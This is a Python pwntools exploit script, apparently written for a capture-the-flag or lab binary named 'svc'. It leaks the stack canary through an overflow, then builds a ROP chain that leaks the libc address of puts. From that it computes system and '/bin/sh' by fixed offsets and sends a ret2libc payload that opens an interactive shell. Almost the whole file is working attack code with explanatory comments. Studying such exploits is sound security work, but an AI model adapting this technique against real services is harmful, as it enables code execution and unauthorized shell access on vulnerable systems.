from pwn import *

target = process('./svc')
#gdb.attach(target, gdbscript = 'b *(0x400d79)')

target.sendline(b"1")

# canary is located after 160 bytes so if we send 161, then
# the print method will leak the canary 
target.sendline(b"A" * 161 + b"canary:")
target.recvuntil(b">>")

target.sendline(b"2")
print(target.recvuntil(b"canary:\n"))
leak = target.recvline()
print(leak)
canary = 0
count = 0

# this gets the leak in the correct form for us 
# to send back to the program
for i in leak:
    if count == 0:
        canary |= i
        canary <<= 8
    if (0 < count < 7):
        i <<= (8 + (8 * count))
        canary |= i
    count += 1

fin_can = p64(int(hex(canary), 16))
target.sendline(b"1")


## now we leak address of puts 

# addresses of puts in GOT and PLT memory
popRDI = p64(0x400ea3)
addGOT = p64(0x602018)
addPLT = p64(0x4008d0)
startMain = p64(0x400a96)

# call puts in PLT with puts in GOT as an argument so that it 
# reveals its location 
# add main to the end so we go back to the beginning
target.sendline(b"A"* 168 + fin_can + b"A" * 8 + popRDI + addGOT + addPLT + startMain )

target.recvuntil(b">>")
target.sendline(b"2")
target.recvuntil(b">>")
target.sendline(b"3")
print(target.recvuntil(b"MIENRALS...\n"))
leak = target.recvline()
count = 0
puts = 0

# save the address of puts in the right form
for i in leak:
    if count == 0:
        puts |= i
        # puts <<= 8
    if (0 < count < 6):
        i <<= 8 * count
        puts |= i 
    count += 1
fin_puts = p64(int(hex(puts), 16))
int_puts = int(hex(puts), 16)
print(hex(puts))

# now have leakage of puts and can use offsets
# found these hex values by previously using gdb to find offsets

# with the address of puts, we know the offsets in libc
# so we use these offsets to find system, "/bin/sh", and exit
beg_libc = int_puts - 0x80ed0
str_sh = beg_libc + 0x1d8698
system = beg_libc + 0x50d60
exit_loc = beg_libc + 0x455f0
popr1514 = p64(0x400ea0)

# have locations of "/bin/sh", system(), and the beginning of libc
# can now send missile and payload
target.sendline(b"1")
target.send(b"A"* 168 + fin_can + b"A" * 8 + popr1514 + p64(0x0) + p64(0x0) + popRDI + p64(str_sh) + p64(system) + p64(exit_loc) + p64(str_sh))

target.sendline(b"3")

target.interactive()
